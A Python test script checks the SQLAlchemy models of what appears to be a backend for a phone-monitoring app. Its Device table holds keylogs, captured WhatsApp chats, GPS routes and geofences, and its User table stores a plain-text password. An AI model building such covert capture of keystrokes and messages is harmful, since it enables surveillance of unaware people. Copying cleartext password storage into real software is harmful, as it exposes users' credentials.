import os
import sys
import time

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from core.models import User, License, Device, Report, SystemPolicy, init_db

print("=== 1. Testing Relational Schema Initialization ===")
test_engine = create_engine("sqlite:///:memory:")
init_db(test_engine)
Session = sessionmaker(bind=test_engine)
session = Session()
print("All 5 relational tables created successfully: OK")

print("\n=== 2. Testing User & License Foreign Key Relationship ===")
user = User(
    username="admin_test",
    password_hash="hash123",
    plain_password="pass",
    role="admin",
    devices=["DEV_01"]
)
session.add(user)
session.commit()

license_entry = License(
    license_key="LIC-TEST-1234",
    assigned_to="admin_test",
    expires_at=int(time.time() + 8640000),
    is_active=True,
    created_at=int(time.time())
)
session.add(license_entry)
session.commit()

fetched_user = session.query(User).filter_by(username="admin_test").first()
assert len(fetched_user.licenses) == 1
assert fetched_user.licenses[0].license_key == "LIC-TEST-1234"
print("User <-> License Relationship & Integrity: OK")

print("\n=== 3. Testing Device Model with JSONB/JSON Columns ===")
device = Device(
    device_id="DEV_01",
    license_key="LIC-TEST-1234",
    info="model: Sensor_Pro\nandroid: 13",
    settings={"lock_track_enabled": True, "geofences": [{"id": "f1", "radius": 500}]},
    today_route=[{"lat": 18.5204, "lng": 73.8567, "time": int(time.time())}],
    keylogs={"k1": {"pkg": "com.test", "text": "sample"}},
    chats={"whatsapp": {"contact1": {"messages": {"m1": {"text": "hello", "type": "received"}}}}}
)
session.add(device)
session.commit()

fetched_dev = session.query(Device).filter_by(device_id="DEV_01").first()
dev_dict = fetched_dev.to_dict()
assert dev_dict["_id"] == "DEV_01"
assert dev_dict["settings"]["lock_track_enabled"] is True
assert len(dev_dict["today_route"]) == 1
assert "whatsapp" in dev_dict["chats"]
print("Device Complex JSON Telemetry Persistence: OK")

print("\n=== 4. Testing System Policy & Reports ===")
policy = SystemPolicy(
    key="main",
    maintenance_mode=False,
    maintenance_message="Active"
)
session.add(policy)

report = Report(
    id="REP_001",
    username="admin_test",
    license_key="LIC-TEST-1234",
    issue_text="Camera lens blur",
    timestamp=int(time.time()),
    status="pending"
)
session.add(report)
session.commit()

fetched_report = session.query(Report).filter_by(id="REP_001").first()
assert fetched_report.issue_text == "Camera lens blur"
print("Policy & Reports Tables: OK")

session.close()

print("\n=======================================================")
print(" ALL POSTGRESQL RELATIONAL SCHEMA TESTS PASSED! ")
print("=======================================================")
